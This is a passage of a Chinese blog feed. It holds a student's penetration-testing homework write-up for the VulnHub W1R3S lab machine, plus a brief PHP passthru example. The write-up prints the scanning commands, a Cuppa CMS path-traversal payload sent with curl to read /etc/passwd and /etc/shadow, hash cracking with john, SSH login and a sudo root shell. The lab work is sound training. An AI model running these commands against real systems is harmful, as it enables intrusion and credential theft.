+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.phptest.php</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>红岩渗透测试作业</title>
+    <url>/2024/01/01/%E7%BA%A2%E5%B2%A9%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/</url>
+    <content><![CDATA[<p>这是在红岩学习的一次作业布置，也是我第一次接触靶机渗透，就随便发发当作记录吧</p>
+<span id="more"></span>
+
+
+
+
+
+<h1 id="渗透测试作业"><a href="#渗透测试作业" class="headerlink" title="渗透测试作业"></a>渗透测试作业</h1><p>靶机原址：<a href="https://www.vulnhub.com/entry/w1r3s-101,220/">源地址</a></p>
+<p>靶机加速站地址：<a href="http://8.130.35.148/w1r3s.v1.0.1.zip">地址</a></p>
+<p>百度网盘：链接：<a href="https://pan.baidu.com/s/1M8Jw2jhm3-_HYOGeDxXZpQ">https://pan.baidu.com/s/1M8Jw2jhm3-_HYOGeDxXZpQ</a><br>                   提取码：1234</p>
+<blockquote>
+<p>上面三种方式，选择对你来说最方便的一种就行了，如果实在下载不下来，可以私聊我，我给你发</p>
+</blockquote>
+<h2 id="作业要求"><a href="#作业要求" class="headerlink" title="作业要求"></a>作业要求</h2><pre><code>1. 这个作业是一个比较有趣靶机进行渗透测试，要求是你获得**W1R3S**机器的root权限，然后读取位于/root目录下的flag.txt
+2. 能做到哪做到那儿，把每一步的过程写清楚，和指令/代码运行结果一起放到报告里（可以进行脱敏处理）
+3. 该靶机是一个公开的靶机，有很多现成的wp，要“借鉴”多少取决于个人，写在报告里即可，尽量自己完成，当然，也可以问我。
+4. level1-信息搜集，尽可能多的写自己收集的信息
+5. leve2-外网打点，找到任意一个漏洞就算通过，当然多多益善
+6. leve3-获得普通用户权限
+7. level4-获得管理员权限，可以尝试下有没有更多提权的方法
+</code></pre>
+<h2 id="一些小的提示："><a href="#一些小的提示：" class="headerlink" title="一些小的提示："></a>一些小的提示：</h2><ul>
+<li><p>靶机如何安装</p>
+<p>下载解压，然后使用vm打开运行即可</p>
+<p>靶机默认使用桥接模式，也就是说直接可以在你的电脑上访问到，如果要使用同在vm中的kali操作，需要设置为nat模式，和kali在同一网段即可，修改网络设置的时候需要将虚拟机 <strong>关机</strong></p>
+</li>
+<li><p>如何查找漏洞</p>
+<p>可以去搜索引擎寻找，也可以在kali中使用<code>searchsploit</code>指令寻找漏洞</p>
+</li>
+<li><p>简化难度的小提示</p>
+<p>某个非常重要，关乎登录的文件具有可读权限</p>
+</li>
+<li><p>关于提权</p>
+<p>这个靶机中的提权很简单，就像操作自己服务器一样</p>
+<p>也可以网上搜索，看看别人关于linux提权的总结</p>
+</li>
+<li><p>提供一篇wp希望 <strong>做完</strong>后可以看一下</p>
+<p>如果最后没有做到level4，写上自己做到那里停住了，那些地方没有想到，然后将知识点补充上</p>
+<p>B号：BV1mB4y1j7K6</p>
+</li>
+</ul>
+<h2 id="作业提交"><a href="#作业提交" class="headerlink" title="作业提交"></a>作业提交</h2><ul>
+<li><p>作业发送到:<strong><a href="mailto:&#x73;&#109;&#97;&#108;&#x6c;&#x62;&#108;&#x61;&#99;&#107;&#x40;&#x72;&#101;&#x64;&#x72;&#x6f;&#99;&#x6b;&#x2e;&#116;&#x65;&#x61;&#x6d;">&#x73;&#109;&#97;&#108;&#x6c;&#x62;&#108;&#x61;&#99;&#107;&#x40;&#x72;&#101;&#x64;&#x72;&#x6f;&#99;&#x6b;&#x2e;&#116;&#x65;&#x61;&#x6d;</a></strong></p>
+<p>主题写上姓名-学号-levelx</p>
+<p>内容就是自己的报告，可以是md可以是网站（md记得外链图片），pdf也可以</p>
+</li>
+</ul>
+<h2 id="作业过程"><a href="#作业过程" class="headerlink" title="作业过程"></a>作业过程</h2><p>下载完靶机后，看提示先把网卡设置为nat模式，这样可以和kali在同一网段，便于在扫描的时候可以扫描得到相关信息</p>
+<p>先用<strong>ifconfig</strong>查看虚拟机的ip地址</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229193817341.png" alt="image-20231229193817341"></p>
+<p>成功得到ip地址为192168.154.133，所以所在网段为192.168.154.0&#x2F;24</p>
+<p>继续用nmap -sn ip进行扫描，具体语句为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.154.0/24</span><br></pre></td></tr></table></figure>
+
+<p>进行扫描后成功得到有五个主机存活</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229194155344.png" alt="image-20231229194155344"></p>
+<p>其中1，2，254都是vm系统用掉的，并且133在上面的ip查看得知是kali的，所以确定靶机ip地址为<strong>192.168.154.136</strong></p>
+<p>继续扫描端口，执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --min-rate=10000 -p- 192.168.154.136</span><br></pre></td></tr></table></figure>
+
+<p>这个代码是以最小速率10000对全部端口（1-65535）进行扫描，10000是权衡的结果，数字过大扫描速度快，但容易遗漏端口，数字过小则扫描时间过长，经验表明10000就是扫描的合适速度。-p是端口参数，-p-表示对所有端口进行扫描。并且对端口进行两次扫描，确保没有信息的遗漏，另一个扫描命令为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sU -p21,22,3306 192.168.154.136</span><br></pre></td></tr></table></figure>
+
+<p>成功扫描出有四个端口开放</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229195158937.png" alt="image-20231229195158937"></p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229201455033.png" alt="image-20231229201455033"></p>
+<p>继续用命令探测操作系统版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namp -O -p21,22,80,3306 192.168.154.136</span><br></pre></td></tr></table></figure>
+
+<p>成功探测出来是linux系统</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229201231276.png" alt="image-20231229201231276"></p>
+<p>因为在上面进行UDP扫描的时候，发现结果表明3306端口关闭，其他三个端口是开放&#x2F;被过滤状态。接下来继续进行nmap自带的web漏扫脚本进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=vuln -p21,22,80 192.168.154.136</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229203316477.png" alt="image-20231229203316477"></p>
+<p>发现这里有一个DOS攻击，在看的教程说这种用来拒绝服务的攻击方式的作用不是很大，所以就先不管这个</p>
+<p>接下来，进行渗透过程</p>
+<p>21端口是ftp文件传输协议的端口，所以先尝试FTP能不能匿名登录</p>
+<p>这里查找相关ftp匿名登陆的资料</p>
+<p>匿名访问的用户名为：anonymous，密码为空。</p>
+<p>首先输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.154.136</span><br></pre></td></tr></table></figure>
+
+<p>并且用户名输入为：anonymous，密码为空。</p>
+<p>尝试了一下，成功登陆进去</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229210053759.png" alt="image-20231229210053759"></p>
+<p>先ls查看一下，发现有三个目录，并且都有读和执行权限</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229210604146.png" alt="image-20231229210604146"></p>
+<p>一个个进入，先进入content目录</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229210743451.png" alt="image-20231229210743451"></p>
+<p>content目录中有三个文本文件，选择全部先下载下来</p>
+<p>查找的别人的wp可知，这里需要注意的是，如果目录下的文件不是文本.txt文件的话，需要先运行binary指令（即输入binary然后回车）转换为二进制格式，以保证通过FTP下载的文件不会损坏。如果本身就是txt文件，则运不运行binary都可。下载的命令是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mget 0*.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229211026510.png" alt="image-20231229211026510"></p>
+<p>将这三个txt文件全部下载下来</p>
+<p>然后再进入第二个目录docs</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ../docs</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229211138544.png" alt="image-20231229211138544"></p>
+<p>发现又有一个文本文件worktodo.txt，也拿走。</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229211208952.png" alt="image-20231229211208952"></p>
+<p>再进入第三个目录new-employees</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ../new-employees</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p>看到还有一个txt文件，也拿走</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229211436556.png" alt="image-20231229211436556"></p>
+<p>下载完所有的文件之后，就退出ftp，重新回到kali查看刚刚下载的文件</p>
+<p>输入bye即可退出ftp</p>
+<p>分别cat01.txt和02.txt</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229211738414.png" alt="image-20231229211738414"></p>
+<p>发现01.txt中没什么可用的内容，但是02.txt中有两行字符串，猜测第一条为md5编码，第二条为base64编码，去尝试一下</p>
+<p>第一条解密完内容是this is not a password</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229212123905.png" alt="image-20231229212123905"></p>
+<p>第二条解密后内容为It is easy, but not that easy..</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229212217523.png" alt="image-20231229212217523"></p>
+<p>对解题也没什么用</p>
+<p>再打开03.txt，发现也不是什么有用的信息</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229212357815.png" alt="image-20231229212357815"></p>
+<p>继续打开worktodo.txt，发现两行反转过来的句子，翻转过来看发现也没什么用处</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229212621168.png" alt="image-20231229212621168"></p>
+<p>再打开最后一个文件，发现是一个员工的名单与他对应的职位</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229212732739.png" alt="image-20231229212732739"></p>
+<p> 拿到了职工的一些信息和职位，说不定有用，先存着。</p>
+<p>继续查看web进行渗透</p>
+<p>使用dirsearch工具对目标主机80端口的web服务进行目录爆破，扫描出爆出两个可疑目录<code>/administrator</code>和<code>/wordpress</code></p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229214157976.png" alt="image-20231229214157976"></p>
+<p>访问下administrator目录, 此处疑似安装漏洞</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229214404809.png" alt="image-20231229214404809"></p>
+<p>尝试安装，发现失败</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229214336734.png" alt="image-20231229214336734"></p>
+<p>同样，因为这个界面的名称，暴露了CMS是Cuppa</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229214758663.png" alt="image-20231229214758663"></p>
+<p>于是尝试用使用searchsploit命令查询Cuppa cms是否存在漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229214857581.png" alt="image-20231229214857581"></p>
+<p>发现有一个远程文件包含漏洞，我们把这个25971.txt下载下来看看怎么利用 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa cms -m 25971.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229215105273.png" alt="image-20231229215105273"></p>
+<p>打开这个文件</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229215415163.png" alt="image-20231229215415163"></p>
+<p>发现了这个文件包含漏洞，这个cms用request函数进行了文件包含，可能造成文件包含漏洞泄露信息。</p>
+<p>我们选取其中一个payload: <a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd%E6%9D%A5%E8%AF%95%E8%AF%95">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd来试试</a></p>
+<p>浏览器访问:<a href="http://192.168.154.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.154.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a>, 没有回显, 此处用的是Get请求, 后面尝试下POST请求</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229220133621.png" alt="image-20231229220133621"></p>
+<p>使用curl命令提交Post请求: curl -X POST -d urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd <a href="http://192.168.154.136/administrator/alerts/alertConfigField.php">http://192.168.154.136/administrator/alerts/alertConfigField.php</a>, 成功得到目标主机的passwd文件内容<br><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229220434435.png" alt="image-20231229220434435"></p>
+<p>获取目标主机的shadow文件: curl -X POST -d urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;shadow <a href="http://192.168.154.136/administrator/alerts/alertConfigField.php">http://192.168.154.136/administrator/alerts/alertConfigField.php</a>, 这里可以看到两处很明显的用户信息<br><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229221058144.png" alt="image-20231229221058144"></p>
+<p>将shadow文件内容复制到hash.txt中, </p>
+<p>我们试试能不能对密码进行解密。先把这些存为一个名为hash的文件。把含有上述三个用户名的hash后的密码复制，vim创建一个文件，名为hash（随便起名），至于其他的行，可以不用复制进hash，仅仅保留www-data,w1r3s,root三行即可，我这里图复制方便，把一些其他的行也复制进hash里面了，创建的hash文件如下</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229221707395.png" alt="image-20231229221707395"></p>
+<p>然后使用john命令进行破解: <code>john hash.txt</code></p>
+<p>成功爆破出了两个密码，www-data的密码也是www-data，w1r3s的密码是computer。root密码始终爆破不出来，等待良久后ctrl + c先退出算了。</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229222010122.png" alt="image-20231229222010122"></p>
+<p>通常情况w1r3s的权限应该是高于www-data的，因此我们用w1r3s远程登录ssh的22端口，试试能不能用密码computer登录。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh w1r3s@192.168.154.136</span><br></pre></td></tr></table></figure>
+
+<p>再输入完密码：computer后，成功登陆</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229222151554.png" alt="image-20231229222151554"></p>
+<p>此处已经拿到了w1r3s的权限</p>
+<p>先看看w1r3s自己是什么权限 :</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname –a</span><br><span class="line">id</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229222412471.png" alt="image-20231229222412471"></p>
+<p>发现w1r3s已经具有了all:all:all的权限，那么我们能够以系统的权限运行&#x2F;bin&#x2F;bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231229222549199.png" alt="image-20231229222549199"></p>
+<p>成功得到提权，拿到root权限，并且成功得到flag！！！</p>
+<p>总结：这是第一次尝试靶机测试，很多知识都不太懂，以至于很多步骤都是跟着教程来的，并且在后面实在是看不懂，只能照猫画虎，搞得整个人都很烦，但是这只是第一步，在后来的学习肯定会更加顺风顺水！！！</p>
+<p>最后附上参考的两个教程：</p>
+<p><a href="https://blog.csdn.net/Bossfrank/article/details/130953265">红队打靶：W1R3S: 1.0.1详细打靶思路（vulnhub）_w1r3s 1.0.1-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/xf555er/article/details/128015707">红队渗透靶场之W1R3S靶场(超详细!)-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+</search>
